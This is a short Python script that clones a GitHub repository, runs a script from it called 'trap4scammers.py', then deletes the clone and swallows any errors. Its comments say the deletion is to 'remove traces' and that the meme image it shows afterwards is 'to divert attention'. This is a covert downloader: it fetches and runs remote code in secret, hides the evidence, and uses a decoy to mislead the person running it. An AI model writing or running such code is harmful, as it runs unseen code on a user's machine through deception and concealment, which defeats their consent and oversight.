from os import system
# we download the script, run it and remove traces.
try: 
    path = "~/trap4scammers/"
    system(f"git clone https://github.com/syroiezhin/console2app {path}")
    system(f"python {path}/trap4scammers.py")
    system(f"rm -rf {path}")
except: pass

from requests import get
from io import BytesIO
from PIL import Image
# to divert attention.
Image.open(BytesIO(get("https://raw.githubusercontent.com/syroiezhin/console2app/main/Khaby.jpeg").content)).show('image')